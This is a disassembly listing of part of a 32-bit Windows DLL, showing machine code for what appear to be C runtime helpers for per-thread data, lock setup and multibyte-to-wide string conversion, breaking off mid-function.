1000655d:	8b f0                	mov    %eax,%esi
1000655f:	85 f6                	test   %esi,%esi
10006561:	74 13                	je     0x10006576
10006563:	6a 00                	push   $0x0
10006565:	ff 35 08 31 01 10    	push   0x10013108
1000656b:	e8 04 f4 ff ff       	call   0x10005974
10006570:	56                   	push   %esi
10006571:	e8 9d fe ff ff       	call   0x10006413
10006576:	5e                   	pop    %esi
10006577:	c3                   	ret
10006578:	8b ff                	mov    %edi,%edi
1000657a:	53                   	push   %ebx
1000657b:	56                   	push   %esi
1000657c:	57                   	push   %edi
1000657d:	ff 15 40 d0 00 10    	call   *0x1000d040
10006583:	8b f0                	mov    %eax,%esi
10006585:	a1 08 31 01 10       	mov    0x10013108,%eax
1000658a:	83 f8 ff             	cmp    $0xffffffff,%eax
1000658d:	74 1c                	je     0x100065ab
1000658f:	50                   	push   %eax
10006590:	e8 a0 f3 ff ff       	call   0x10005935
10006595:	8b f8                	mov    %eax,%edi
10006597:	85 ff                	test   %edi,%edi
10006599:	74 0b                	je     0x100065a6
1000659b:	83 ff ff             	cmp    $0xffffffff,%edi
1000659e:	75 78                	jne    0x10006618
100065a0:	33 db                	xor    %ebx,%ebx
100065a2:	8b fb                	mov    %ebx,%edi
100065a4:	eb 74                	jmp    0x1000661a
100065a6:	a1 08 31 01 10       	mov    0x10013108,%eax
100065ab:	6a ff                	push   $0xffffffff
100065ad:	50                   	push   %eax
100065ae:	e8 c1 f3 ff ff       	call   0x10005974
100065b3:	85 c0                	test   %eax,%eax
100065b5:	74 e9                	je     0x100065a0
100065b7:	68 64 03 00 00       	push   $0x364
100065bc:	6a 01                	push   $0x1
100065be:	e8 66 f0 ff ff       	call   0x10005629
100065c3:	8b f8                	mov    %eax,%edi
100065c5:	59                   	pop    %ecx
100065c6:	59                   	pop    %ecx
100065c7:	85 ff                	test   %edi,%edi
100065c9:	75 17                	jne    0x100065e2
100065cb:	33 db                	xor    %ebx,%ebx
100065cd:	53                   	push   %ebx
100065ce:	ff 35 08 31 01 10    	push   0x10013108
100065d4:	e8 9b f3 ff ff       	call   0x10005974
100065d9:	53                   	push   %ebx
100065da:	e8 a7 f0 ff ff       	call   0x10005686
100065df:	59                   	pop    %ecx
100065e0:	eb c0                	jmp    0x100065a2
100065e2:	57                   	push   %edi
100065e3:	ff 35 08 31 01 10    	push   0x10013108
100065e9:	e8 86 f3 ff ff       	call   0x10005974
100065ee:	85 c0                	test   %eax,%eax
100065f0:	75 11                	jne    0x10006603
100065f2:	33 db                	xor    %ebx,%ebx
100065f4:	53                   	push   %ebx
100065f5:	ff 35 08 31 01 10    	push   0x10013108
100065fb:	e8 74 f3 ff ff       	call   0x10005974
10006600:	57                   	push   %edi
10006601:	eb d7                	jmp    0x100065da
10006603:	68 58 45 01 10       	push   $0x10014558
10006608:	57                   	push   %edi
10006609:	e8 6c fd ff ff       	call   0x1000637a
1000660e:	6a 00                	push   $0x0
10006610:	e8 71 f0 ff ff       	call   0x10005686
10006615:	83 c4 0c             	add    $0xc,%esp
10006618:	8b df                	mov    %edi,%ebx
1000661a:	56                   	push   %esi
1000661b:	ff 15 94 d0 00 10    	call   *0x1000d094
10006621:	f7 df                	neg    %edi
10006623:	1b ff                	sbb    %edi,%edi
10006625:	23 fb                	and    %ebx,%edi
10006627:	74 06                	je     0x1000662f
10006629:	8b c7                	mov    %edi,%eax
1000662b:	5f                   	pop    %edi
1000662c:	5e                   	pop    %esi
1000662d:	5b                   	pop    %ebx
1000662e:	c3                   	ret
1000662f:	e8 73 ec ff ff       	call   0x100052a7
10006634:	cc                   	int3
10006635:	a1 08 31 01 10       	mov    0x10013108,%eax
1000663a:	56                   	push   %esi
1000663b:	83 f8 ff             	cmp    $0xffffffff,%eax
1000663e:	74 18                	je     0x10006658
10006640:	50                   	push   %eax
10006641:	e8 ef f2 ff ff       	call   0x10005935
10006646:	8b f0                	mov    %eax,%esi
10006648:	85 f6                	test   %esi,%esi
1000664a:	74 07                	je     0x10006653
1000664c:	83 fe ff             	cmp    $0xffffffff,%esi
1000664f:	74 78                	je     0x100066c9
10006651:	eb 6e                	jmp    0x100066c1
10006653:	a1 08 31 01 10       	mov    0x10013108,%eax
10006658:	6a ff                	push   $0xffffffff
1000665a:	50                   	push   %eax
1000665b:	e8 14 f3 ff ff       	call   0x10005974
10006660:	85 c0                	test   %eax,%eax
10006662:	74 65                	je     0x100066c9
10006664:	68 64 03 00 00       	push   $0x364
10006669:	6a 01                	push   $0x1
1000666b:	e8 b9 ef ff ff       	call   0x10005629
10006670:	8b f0                	mov    %eax,%esi
10006672:	59                   	pop    %ecx
10006673:	59                   	pop    %ecx
10006674:	85 f6                	test   %esi,%esi
10006676:	75 15                	jne    0x1000668d
10006678:	50                   	push   %eax
10006679:	ff 35 08 31 01 10    	push   0x10013108
1000667f:	e8 f0 f2 ff ff       	call   0x10005974
10006684:	56                   	push   %esi
10006685:	e8 fc ef ff ff       	call   0x10005686
1000668a:	59                   	pop    %ecx
1000668b:	eb 3c                	jmp    0x100066c9
1000668d:	56                   	push   %esi
1000668e:	ff 35 08 31 01 10    	push   0x10013108
10006694:	e8 db f2 ff ff       	call   0x10005974
10006699:	85 c0                	test   %eax,%eax
1000669b:	75 0f                	jne    0x100066ac
1000669d:	50                   	push   %eax
1000669e:	ff 35 08 31 01 10    	push   0x10013108
100066a4:	e8 cb f2 ff ff       	call   0x10005974
100066a9:	56                   	push   %esi
100066aa:	eb d9                	jmp    0x10006685
100066ac:	68 58 45 01 10       	push   $0x10014558
100066b1:	56                   	push   %esi
100066b2:	e8 c3 fc ff ff       	call   0x1000637a
100066b7:	6a 00                	push   $0x0
100066b9:	e8 c8 ef ff ff       	call   0x10005686
100066be:	83 c4 0c             	add    $0xc,%esp
100066c1:	85 f6                	test   %esi,%esi
100066c3:	74 04                	je     0x100066c9
100066c5:	8b c6                	mov    %esi,%eax
100066c7:	5e                   	pop    %esi
100066c8:	c3                   	ret
100066c9:	e8 d9 eb ff ff       	call   0x100052a7
100066ce:	cc                   	int3
100066cf:	8b ff                	mov    %edi,%edi
100066d1:	53                   	push   %ebx
100066d2:	56                   	push   %esi
100066d3:	57                   	push   %edi
100066d4:	ff 15 40 d0 00 10    	call   *0x1000d040
100066da:	8b f0                	mov    %eax,%esi
100066dc:	a1 08 31 01 10       	mov    0x10013108,%eax
100066e1:	83 f8 ff             	cmp    $0xffffffff,%eax
100066e4:	74 1c                	je     0x10006702
100066e6:	50                   	push   %eax
100066e7:	e8 49 f2 ff ff       	call   0x10005935
100066ec:	8b f8                	mov    %eax,%edi
100066ee:	85 ff                	test   %edi,%edi
100066f0:	74 0b                	je     0x100066fd
100066f2:	83 ff ff             	cmp    $0xffffffff,%edi
100066f5:	75 78                	jne    0x1000676f
100066f7:	33 db                	xor    %ebx,%ebx
100066f9:	8b fb                	mov    %ebx,%edi
100066fb:	eb 74                	jmp    0x10006771
100066fd:	a1 08 31 01 10       	mov    0x10013108,%eax
10006702:	6a ff                	push   $0xffffffff
10006704:	50                   	push   %eax
10006705:	e8 6a f2 ff ff       	call   0x10005974
1000670a:	85 c0                	test   %eax,%eax
1000670c:	74 e9                	je     0x100066f7
1000670e:	68 64 03 00 00       	push   $0x364
10006713:	6a 01                	push   $0x1
10006715:	e8 0f ef ff ff       	call   0x10005629
1000671a:	8b f8                	mov    %eax,%edi
1000671c:	59                   	pop    %ecx
1000671d:	59                   	pop    %ecx
1000671e:	85 ff                	test   %edi,%edi
10006720:	75 17                	jne    0x10006739
10006722:	33 db                	xor    %ebx,%ebx
10006724:	53                   	push   %ebx
10006725:	ff 35 08 31 01 10    	push   0x10013108
1000672b:	e8 44 f2 ff ff       	call   0x10005974
10006730:	53                   	push   %ebx
10006731:	e8 50 ef ff ff       	call   0x10005686
10006736:	59                   	pop    %ecx
10006737:	eb c0                	jmp    0x100066f9
10006739:	57                   	push   %edi
1000673a:	ff 35 08 31 01 10    	push   0x10013108
10006740:	e8 2f f2 ff ff       	call   0x10005974
10006745:	85 c0                	test   %eax,%eax
10006747:	75 11                	jne    0x1000675a
10006749:	33 db                	xor    %ebx,%ebx
1000674b:	53                   	push   %ebx
1000674c:	ff 35 08 31 01 10    	push   0x10013108
10006752:	e8 1d f2 ff ff       	call   0x10005974
10006757:	57                   	push   %edi
10006758:	eb d7                	jmp    0x10006731
1000675a:	68 58 45 01 10       	push   $0x10014558
1000675f:	57                   	push   %edi
10006760:	e8 15 fc ff ff       	call   0x1000637a
10006765:	6a 00                	push   $0x0
10006767:	e8 1a ef ff ff       	call   0x10005686
1000676c:	83 c4 0c             	add    $0xc,%esp
1000676f:	8b df                	mov    %edi,%ebx
10006771:	56                   	push   %esi
10006772:	ff 15 94 d0 00 10    	call   *0x1000d094
10006778:	f7 df                	neg    %edi
1000677a:	1b ff                	sbb    %edi,%edi
1000677c:	23 fb                	and    %ebx,%edi
1000677e:	8b c7                	mov    %edi,%eax
10006780:	5f                   	pop    %edi
10006781:	5e                   	pop    %esi
10006782:	5b                   	pop    %ebx
10006783:	c3                   	ret
10006784:	68 13 64 00 10       	push   $0x10006413
10006789:	e8 29 f1 ff ff       	call   0x100058b7
1000678e:	a3 08 31 01 10       	mov    %eax,0x10013108
10006793:	83 f8 ff             	cmp    $0xffffffff,%eax
10006796:	75 03                	jne    0x1000679b
10006798:	32 c0                	xor    %al,%al
1000679a:	c3                   	ret
1000679b:	e8 2f ff ff ff       	call   0x100066cf
100067a0:	85 c0                	test   %eax,%eax
100067a2:	75 09                	jne    0x100067ad
100067a4:	50                   	push   %eax
100067a5:	e8 06 00 00 00       	call   0x100067b0
100067aa:	59                   	pop    %ecx
100067ab:	eb eb                	jmp    0x10006798
100067ad:	b0 01                	mov    $0x1,%al
100067af:	c3                   	ret
100067b0:	a1 08 31 01 10       	mov    0x10013108,%eax
100067b5:	83 f8 ff             	cmp    $0xffffffff,%eax
100067b8:	74 0d                	je     0x100067c7
100067ba:	50                   	push   %eax
100067bb:	e8 36 f1 ff ff       	call   0x100058f6
100067c0:	83 0d 08 31 01 10 ff 	orl    $0xffffffff,0x10013108
100067c7:	b0 01                	mov    $0x1,%al
100067c9:	c3                   	ret
100067ca:	8b ff                	mov    %edi,%edi
100067cc:	55                   	push   %ebp
100067cd:	8b ec                	mov    %esp,%ebp
100067cf:	56                   	push   %esi
100067d0:	8b 75 0c             	mov    0xc(%ebp),%esi
100067d3:	8b 06                	mov    (%esi),%eax
100067d5:	3b 05 58 45 01 10    	cmp    0x10014558,%eax
100067db:	74 17                	je     0x100067f4
100067dd:	8b 4d 08             	mov    0x8(%ebp),%ecx
100067e0:	a1 f8 36 01 10       	mov    0x100136f8,%eax
100067e5:	85 81 50 03 00 00    	test   %eax,0x350(%ecx)
100067eb:	75 07                	jne    0x100067f4
100067ed:	e8 af 2e 00 00       	call   0x100096a1
100067f2:	89 06                	mov    %eax,(%esi)
100067f4:	5e                   	pop    %esi
100067f5:	5d                   	pop    %ebp
100067f6:	c3                   	ret
100067f7:	8b ff                	mov    %edi,%edi
100067f9:	55                   	push   %ebp
100067fa:	8b ec                	mov    %esp,%ebp
100067fc:	56                   	push   %esi
100067fd:	8b 75 0c             	mov    0xc(%ebp),%esi
10006800:	8b 06                	mov    (%esi),%eax
10006802:	3b 05 bc 46 01 10    	cmp    0x100146bc,%eax
10006808:	74 17                	je     0x10006821
1000680a:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000680d:	a1 f8 36 01 10       	mov    0x100136f8,%eax
10006812:	85 81 50 03 00 00    	test   %eax,0x350(%ecx)
10006818:	75 07                	jne    0x10006821
1000681a:	e8 d8 10 00 00       	call   0x100078f7
1000681f:	89 06                	mov    %eax,(%esi)
10006821:	5e                   	pop    %esi
10006822:	5d                   	pop    %ebp
10006823:	c3                   	ret
10006824:	8b ff                	mov    %edi,%edi
10006826:	55                   	push   %ebp
10006827:	8b ec                	mov    %esp,%ebp
10006829:	8b 45 08             	mov    0x8(%ebp),%eax
1000682c:	85 c0                	test   %eax,%eax
1000682e:	75 15                	jne    0x10006845
10006830:	e8 e1 ed ff ff       	call   0x10005616
10006835:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
1000683b:	e8 19 ed ff ff       	call   0x10005559
10006840:	83 c8 ff             	or     $0xffffffff,%eax
10006843:	5d                   	pop    %ebp
10006844:	c3                   	ret
10006845:	8b 40 10             	mov    0x10(%eax),%eax
10006848:	90                   	nop
10006849:	5d                   	pop    %ebp
1000684a:	c3                   	ret
1000684b:	6a 0c                	push   $0xc
1000684d:	68 18 25 01 10       	push   $0x10012518
10006852:	e8 49 be ff ff       	call   0x100026a0
10006857:	8b 45 08             	mov    0x8(%ebp),%eax
1000685a:	ff 30                	push   (%eax)
1000685c:	e8 cb 00 00 00       	call   0x1000692c
10006861:	59                   	pop    %ecx
10006862:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10006866:	be 58 45 01 10       	mov    $0x10014558,%esi
1000686b:	bf 10 31 01 10       	mov    $0x10013110,%edi
10006870:	89 75 e4             	mov    %esi,-0x1c(%ebp)
10006873:	81 fe 5c 45 01 10    	cmp    $0x1001455c,%esi
10006879:	74 14                	je     0x1000688f
1000687b:	39 3e                	cmp    %edi,(%esi)
1000687d:	74 0b                	je     0x1000688a
1000687f:	57                   	push   %edi
10006880:	56                   	push   %esi
10006881:	e8 9c 2e 00 00       	call   0x10009722
10006886:	59                   	pop    %ecx
10006887:	59                   	pop    %ecx
10006888:	89 06                	mov    %eax,(%esi)
1000688a:	83 c6 04             	add    $0x4,%esi
1000688d:	eb e1                	jmp    0x10006870
1000688f:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
10006896:	e8 12 00 00 00       	call   0x100068ad
1000689b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000689e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100068a5:	59                   	pop    %ecx
100068a6:	5f                   	pop    %edi
100068a7:	5e                   	pop    %esi
100068a8:	5b                   	pop    %ebx
100068a9:	c9                   	leave
100068aa:	c2 0c 00             	ret    $0xc
100068ad:	8b 45 10             	mov    0x10(%ebp),%eax
100068b0:	ff 30                	push   (%eax)
100068b2:	e8 bd 00 00 00       	call   0x10006974
100068b7:	59                   	pop    %ecx
100068b8:	c3                   	ret
100068b9:	33 c0                	xor    %eax,%eax
100068bb:	b9 54 45 01 10       	mov    $0x10014554,%ecx
100068c0:	40                   	inc    %eax
100068c1:	87 01                	xchg   %eax,(%ecx)
100068c3:	c3                   	ret
100068c4:	8b ff                	mov    %edi,%edi
100068c6:	55                   	push   %ebp
100068c7:	8b ec                	mov    %esp,%ebp
100068c9:	83 ec 0c             	sub    $0xc,%esp
100068cc:	6a 04                	push   $0x4
100068ce:	58                   	pop    %eax
100068cf:	89 45 f8             	mov    %eax,-0x8(%ebp)
100068d2:	8d 4d ff             	lea    -0x1(%ebp),%ecx
100068d5:	89 45 f4             	mov    %eax,-0xc(%ebp)
100068d8:	8d 45 f8             	lea    -0x8(%ebp),%eax
100068db:	50                   	push   %eax
100068dc:	8d 45 ff             	lea    -0x1(%ebp),%eax
100068df:	50                   	push   %eax
100068e0:	8d 45 f4             	lea    -0xc(%ebp),%eax
100068e3:	50                   	push   %eax
100068e4:	e8 62 ff ff ff       	call   0x1000684b
100068e9:	c9                   	leave
100068ea:	c3                   	ret
100068eb:	8b ff                	mov    %edi,%edi
100068ed:	56                   	push   %esi
100068ee:	57                   	push   %edi
100068ef:	bf 60 45 01 10       	mov    $0x10014560,%edi
100068f4:	33 f6                	xor    %esi,%esi
100068f6:	6a 00                	push   $0x0
100068f8:	68 a0 0f 00 00       	push   $0xfa0
100068fd:	57                   	push   %edi
100068fe:	e8 b3 f0 ff ff       	call   0x100059b6
10006903:	85 c0                	test   %eax,%eax
10006905:	74 18                	je     0x1000691f
10006907:	ff 05 b0 46 01 10    	incl   0x100146b0
1000690d:	83 c6 18             	add    $0x18,%esi
10006910:	83 c7 18             	add    $0x18,%edi
10006913:	81 fe 50 01 00 00    	cmp    $0x150,%esi
10006919:	72 db                	jb     0x100068f6
1000691b:	b0 01                	mov    $0x1,%al
1000691d:	eb 0a                	jmp    0x10006929
1000691f:	6a 00                	push   $0x0
10006921:	e8 1d 00 00 00       	call   0x10006943
10006926:	59                   	pop    %ecx
10006927:	32 c0                	xor    %al,%al
10006929:	5f                   	pop    %edi
1000692a:	5e                   	pop    %esi
1000692b:	c3                   	ret
1000692c:	8b ff                	mov    %edi,%edi
1000692e:	55                   	push   %ebp
1000692f:	8b ec                	mov    %esp,%ebp
10006931:	6b 45 08 18          	imul   $0x18,0x8(%ebp),%eax
10006935:	05 60 45 01 10       	add    $0x10014560,%eax
1000693a:	50                   	push   %eax
1000693b:	ff 15 98 d0 00 10    	call   *0x1000d098
10006941:	5d                   	pop    %ebp
10006942:	c3                   	ret
10006943:	8b ff                	mov    %edi,%edi
10006945:	56                   	push   %esi
10006946:	8b 35 b0 46 01 10    	mov    0x100146b0,%esi
1000694c:	85 f6                	test   %esi,%esi
1000694e:	74 20                	je     0x10006970
10006950:	6b c6 18             	imul   $0x18,%esi,%eax
10006953:	57                   	push   %edi
10006954:	8d b8 48 45 01 10    	lea    0x10014548(%eax),%edi
1000695a:	57                   	push   %edi
1000695b:	ff 15 a0 d0 00 10    	call   *0x1000d0a0
10006961:	ff 0d b0 46 01 10    	decl   0x100146b0
10006967:	83 ef 18             	sub    $0x18,%edi
1000696a:	83 ee 01             	sub    $0x1,%esi
1000696d:	75 eb                	jne    0x1000695a
1000696f:	5f                   	pop    %edi
10006970:	b0 01                	mov    $0x1,%al
10006972:	5e                   	pop    %esi
10006973:	c3                   	ret
10006974:	8b ff                	mov    %edi,%edi
10006976:	55                   	push   %ebp
10006977:	8b ec                	mov    %esp,%ebp
10006979:	6b 45 08 18          	imul   $0x18,0x8(%ebp),%eax
1000697d:	05 60 45 01 10       	add    $0x10014560,%eax
10006982:	50                   	push   %eax
10006983:	ff 15 9c d0 00 10    	call   *0x1000d09c
10006989:	5d                   	pop    %ebp
1000698a:	c3                   	ret
1000698b:	8b ff                	mov    %edi,%edi
1000698d:	55                   	push   %ebp
1000698e:	8b ec                	mov    %esp,%ebp
10006990:	51                   	push   %ecx
10006991:	64 a1 30 00 00 00    	mov    %fs:0x30,%eax
10006997:	56                   	push   %esi
10006998:	33 f6                	xor    %esi,%esi
1000699a:	89 75 fc             	mov    %esi,-0x4(%ebp)
1000699d:	8b 40 10             	mov    0x10(%eax),%eax
100069a0:	39 70 08             	cmp    %esi,0x8(%eax)
100069a3:	7c 0f                	jl     0x100069b4
100069a5:	8d 45 fc             	lea    -0x4(%ebp),%eax
100069a8:	50                   	push   %eax
100069a9:	e8 aa ee ff ff       	call   0x10005858
100069ae:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
100069b2:	74 03                	je     0x100069b7
100069b4:	33 f6                	xor    %esi,%esi
100069b6:	46                   	inc    %esi
100069b7:	8b c6                	mov    %esi,%eax
100069b9:	5e                   	pop    %esi
100069ba:	c9                   	leave
100069bb:	c3                   	ret
100069bc:	8b ff                	mov    %edi,%edi
100069be:	55                   	push   %ebp
100069bf:	8b ec                	mov    %esp,%ebp
100069c1:	8b 45 0c             	mov    0xc(%ebp),%eax
100069c4:	3b 45 08             	cmp    0x8(%ebp),%eax
100069c7:	76 05                	jbe    0x100069ce
100069c9:	83 c8 ff             	or     $0xffffffff,%eax
100069cc:	5d                   	pop    %ebp
100069cd:	c3                   	ret
100069ce:	1b c0                	sbb    %eax,%eax
100069d0:	f7 d8                	neg    %eax
100069d2:	5d                   	pop    %ebp
100069d3:	c3                   	ret
100069d4:	8b ff                	mov    %edi,%edi
100069d6:	55                   	push   %ebp
100069d7:	8b ec                	mov    %esp,%ebp
100069d9:	56                   	push   %esi
100069da:	8b 75 08             	mov    0x8(%ebp),%esi
100069dd:	57                   	push   %edi
100069de:	85 f6                	test   %esi,%esi
100069e0:	75 1a                	jne    0x100069fc
100069e2:	8b 75 0c             	mov    0xc(%ebp),%esi
100069e5:	8b ce                	mov    %esi,%ecx
100069e7:	e8 bc 06 00 00       	call   0x100070a8
100069ec:	33 ff                	xor    %edi,%edi
100069ee:	89 7e 08             	mov    %edi,0x8(%esi)
100069f1:	89 7e 0c             	mov    %edi,0xc(%esi)
100069f4:	89 7e 10             	mov    %edi,0x10(%esi)
100069f7:	e9 84 00 00 00       	jmp    0x10006a80
100069fc:	33 ff                	xor    %edi,%edi
100069fe:	80 3e 00             	cmpb   $0x0,(%esi)
10006a01:	75 1f                	jne    0x10006a22
10006a03:	8b 75 0c             	mov    0xc(%ebp),%esi
10006a06:	39 7e 0c             	cmp    %edi,0xc(%esi)
10006a09:	75 0d                	jne    0x10006a18
10006a0b:	6a 01                	push   $0x1
10006a0d:	8b ce                	mov    %esi,%ecx
10006a0f:	e8 ea 06 00 00       	call   0x100070fe
10006a14:	85 c0                	test   %eax,%eax
10006a16:	75 6a                	jne    0x10006a82
10006a18:	8b 46 08             	mov    0x8(%esi),%eax
10006a1b:	33 c9                	xor    %ecx,%ecx
10006a1d:	66 89 08             	mov    %cx,(%eax)
10006a20:	eb d2                	jmp    0x100069f4
10006a22:	57                   	push   %edi
10006a23:	57                   	push   %edi
10006a24:	6a ff                	push   $0xffffffff
10006a26:	56                   	push   %esi
10006a27:	6a 09                	push   $0x9
10006a29:	ff 75 14             	push   0x14(%ebp)
10006a2c:	e8 d5 11 00 00       	call   0x10007c06
10006a31:	83 c4 18             	add    $0x18,%esp
10006a34:	85 c0                	test   %eax,%eax
10006a36:	75 16                	jne    0x10006a4e
10006a38:	ff 15 40 d0 00 10    	call   *0x1000d040
10006a3e:	50                   	push   %eax
10006a3f:	e8 9c eb ff ff       	call   0x100055e0
10006a44:	59                   	pop    %ecx
10006a45:	e8 cc eb ff ff       	call   0x10005616
10006a4a:	8b 00                	mov    (%eax),%eax
10006a4c:	eb 34                	jmp    0x10006a82
10006a4e:	8b 7d 0c             	mov    0xc(%ebp),%edi
10006a51:	3b 47 0c             	cmp    0xc(%edi),%eax
10006a54:	76 0c                	jbe    0x10006a62
10006a56:	50                   	push   %eax
10006a57:	8b cf                	mov    %edi,%ecx
10006a59:	e8 a0 06 00 00       	call   0x100070fe
10006a5e:	85 c0                	test   %eax,%eax
10006a60:	75 20                	jne    0x10006a82
10006a62:	ff 77 0c             	push   0xc(%edi)
10006a65:	ff 77 08             	push   0x8(%edi)
10006a68:	6a ff                	push   $0xffffffff
10006a6a:	56                   	push   %esi
10006a6b:	6a 09                	push   $0x9
10006a6d:	ff 75 14             	push   0x14(%ebp)
10006a70:	e8 91 11 00 00       	call   0x10007c06
10006a75:	83 c4 18             	add    $0x18,%esp
10006a78:	85 c0                	test   %eax,%eax
10006a7a:	74 bc                	je     0x10006a38
10006a7c:	48                   	dec    %eax
10006a7d:	89 47 10             	mov    %eax,0x10(%edi)
10006a80:	33 c0                	xor    %eax,%eax
10006a82:	5f                   	pop    %edi
10006a83:	5e                   	pop    %esi
10006a84:	5d                   	pop    %ebp
10006a85:	c3                   	ret
10006a86:	8b ff                	mov    %edi,%edi
10006a88:	55                   	push   %ebp
10006a89:	8b ec                	mov    %esp,%ebp
10006a8b:	53                   	push   %ebx
10006a8c:	56                   	push   %esi
10006a8d:	8b 75 08             	mov    0x8(%ebp),%esi
10006a90:	85 f6                	test   %esi,%esi
10006a92:	75 1c                	jne    0x10006ab0
10006a94:	8b 75 0c             	mov    0xc(%ebp),%esi
10006a97:	8b ce                	mov    %esi,%ecx
10006a99:	e8 0a 06 00 00       	call   0x100070a8
10006a9e:	33 db                	xor    %ebx,%ebx
10006aa0:	89 5e 08             	mov    %ebx,0x8(%esi)
10006aa3:	89 5e 0c             	mov    %ebx,0xc(%esi)
10006aa6:	89 5e 10             	mov    %ebx,0x10(%esi)
10006aa9:	33 c0                	xor    %eax,%eax
10006aab:	e9 a1 00 00 00       	jmp    0x10006b51
10006ab0:	33 db                	xor    %ebx,%ebx
10006ab2:	66 39 1e             	cmp    %bx,(%esi)
10006ab5:	75 20                	jne    0x10006ad7
10006ab7:	8b 75 0c             	mov    0xc(%ebp),%esi
10006aba:	39 5e 0c             	cmp    %ebx,0xc(%esi)
10006abd:	75 11                	jne    0x10006ad0
10006abf:	6a 01                	push   $0x1
10006ac1:	8b ce                	mov    %esi,%ecx
10006ac3:	e8 fa 05 00 00       	call   0x100070c2
10006ac8:	85 c0                	test   %eax,%eax
10006aca:	0f 85 81 00 00 00    	jne    0x10006b51
10006ad0:	8b 46 08             	mov    0x8(%esi),%eax
10006ad3:	88 18                	mov    %bl,(%eax)
10006ad5:	eb cf                	jmp    0x10006aa6
10006ad7:	53                   	push   %ebx
10006ad8:	53                   	push   %ebx
10006ad9:	53                   	push   %ebx
10006ada:	53                   	push   %ebx
10006adb:	6a ff                	push   $0xffffffff
10006add:	56                   	push   %esi
10006ade:	53                   	push   %ebx
10006adf:	ff 75 14             	push   0x14(%ebp)
10006ae2:	e8 9b 11 00 00       	call   0x10007c82
10006ae7:	83 c4 20             	add    $0x20,%esp
10006aea:	85 c0                	test   %eax,%eax
10006aec:	75 16                	jne    0x10006b04
10006aee:	ff 15 40 d0 00 10    	call   *0x1000d040
10006af4:	50                   	push   %eax
10006af5:	e8 e6 ea ff ff       	call   0x100055e0
10006afa:	59                   	pop    %ecx
10006afb:	e8 16 eb ff ff       	call   0x10005616
10006b00:	8b 00                	mov    (%eax),%eax
10006b02:	eb 4d                	jmp    0x10006b51
10006b04:	57                   	push   %edi
10006b05:	8b 7d 0c             	mov    0xc(%ebp),%edi
10006b08:	3b 47 0c             	cmp    0xc(%edi),%eax
10006b0b:	76 0c                	jbe    0x10006b19
10006b0d:	50                   	push   %eax
10006b0e:	8b cf                	mov    %edi,%ecx
10006b10:	e8 ad 05 00 00       	call   0x100070c2
10006b15:	85 c0                	test   %eax,%eax
10006b17:	75 37                	jne    0x10006b50
10006b19:	53                   	push   %ebx
10006b1a:	53                   	push   %ebx
10006b1b:	ff 77 0c             	push   0xc(%edi)
10006b1e:	ff 77 08             	push   0x8(%edi)
10006b21:	6a ff                	push   $0xffffffff
10006b23:	56                   	push   %esi
10006b24:	53                   	push   %ebx
10006b25:	ff 75 14             	push   0x14(%ebp)
10006b28:	e8 55 11 00 00       	call   0x10007c82
10006b2d:	83 c4 20             	add    $0x20,%esp
10006b30:	85 c0                	test   %eax,%eax
10006b32:	75 16                	jne    0x10006b4a
10006b34:	ff 15 40 d0 00 10    	call   *0x1000d040
10006b3a:	50                   	push   %eax
10006b3b:	e8 a0 ea ff ff       	call   0x100055e0
10006b40:	59                   	pop    %ecx
10006b41:	e8 d0 ea ff ff       	call   0x10005616
10006b46:	8b 00                	mov    (%eax),%eax
10006b48:	eb 06                	jmp    0x10006b50
10006b4a:	48                   	dec    %eax
10006b4b:	89 47 10             	mov    %eax,0x10(%edi)
10006b4e:	33 c0                	xor    %eax,%eax
10006b50:	5f                   	pop    %edi
10006b51:	5e                   	pop    %esi
10006b52:	5b                   	pop    %ebx
10006b53:	5d                   	pop    %ebp
10006b54:	c3                   	ret
10006b55:	8b ff                	mov    %edi,%edi
10006b57:	55                   	push   %ebp
10006b58:	8b ec                	mov    %esp,%ebp
10006b5a:	51                   	push   %ecx
10006b5b:	ff 75 10             	push   0x10(%ebp)
10006b5e:	8d 45 ff             	lea    -0x1(%ebp),%eax
10006b61:	50                   	push   %eax
10006b62:	ff 75 0c             	push   0xc(%ebp)
10006b65:	ff 75 08             	push   0x8(%ebp)
10006b68:	e8 67 fe ff ff       	call   0x100069d4
10006b6d:	83 c4 10             	add    $0x10,%esp
10006b70:	c9                   	leave
10006b71:	c3                   	ret
10006b72:	8b ff                	mov    %edi,%edi
10006b74:	55                   	push   %ebp
10006b75:	8b ec                	mov    %esp,%ebp
10006b77:	8b 45 0c             	mov    0xc(%ebp),%eax
10006b7a:	83 ec 28             	sub    $0x28,%esp
10006b7d:	56                   	push   %esi
10006b7e:	85 c0                	test   %eax,%eax
10006b80:	75 14                	jne    0x10006b96
10006b82:	e8 8f ea ff ff       	call   0x10005616
10006b87:	6a 16                	push   $0x16
10006b89:	5e                   	pop    %esi
10006b8a:	89 30                	mov    %esi,(%eax)
10006b8c:	e8 c8 e9 ff ff       	call   0x10005559
10006b91:	e9 bb 01 00 00       	jmp    0x10006d51
10006b96:	8b 75 08             	mov    0x8(%ebp),%esi
10006b99:	53                   	push   %ebx
10006b9a:	33 db                	xor    %ebx,%ebx
10006b9c:	57                   	push   %edi
10006b9d:	89 18                	mov    %ebx,(%eax)
10006b9f:	8b fb                	mov    %ebx,%edi
10006ba1:	8b 06                	mov    (%esi),%eax
10006ba3:	8b cb                	mov    %ebx,%ecx
10006ba5:	89 7d d8             	mov    %edi,-0x28(%ebp)
10006ba8:	89 4d dc             	mov    %ecx,-0x24(%ebp)
10006bab:	89 5d e0             	mov    %ebx,-0x20(%ebp)
10006bae:	85 c0                	test   %eax,%eax
10006bb0:	74 61                	je     0x10006c13
10006bb2:	8d 4d fc             	lea    -0x4(%ebp),%ecx
10006bb5:	66 c7 45 fc 2a 3f    	movw   $0x3f2a,-0x4(%ebp)
10006bbb:	51                   	push   %ecx
10006bbc:	50                   	push   %eax
10006bbd:	88 5d fe             	mov    %bl,-0x2(%ebp)
10006bc0:	e8 fb 34 00 00       	call   0x1000a0c0
10006bc5:	59                   	pop    %ecx
10006bc6:	59                   	pop    %ecx
10006bc7:	8b 0e                	mov    (%esi),%ecx
10006bc9:	85 c0                	test   %eax,%eax
10006bcb:	75 16                	jne    0x10006be3
10006bcd:	8d 45 d8             	lea    -0x28(%ebp),%eax
10006bd0:	50                   	push   %eax
10006bd1:	53                   	push   %ebx
